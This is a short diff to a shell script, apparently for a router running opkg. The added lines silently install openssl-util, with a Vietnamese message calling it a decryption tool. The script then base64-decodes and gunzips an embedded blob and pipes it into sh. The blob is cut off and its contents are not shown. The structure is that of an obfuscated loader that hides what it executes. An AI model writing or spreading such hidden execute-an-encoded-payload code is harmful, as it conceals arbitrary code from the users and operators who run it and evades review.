@@ -1,4 +1,9 @@
 #!/bin/sh
+if ! command -v openssl >/dev/null 2>&1; then
+    echo "Dang cai dat cong cu giai ma (openssl-util)..."
+    opkg update >/dev/null 2>&1
+    opkg install openssl-util >/dev/null 2>&1
+fi
 openssl enc -d -base64 << 'EOF' | gunzip | sh
 H4sIAAAAAAAEAJ1UbU/bMBD+nl9xhA8Upry0vBbBtKowQEwEtWX7MqlybTexmtjGscvLtv++S5oI
 hIo05g+25bt7/Nw9Z29uRDMhozLzOM0U+Kf/OvwmAOBscHMBw8EVbiZwfTm4uYRRcjc5H0EyhuVR
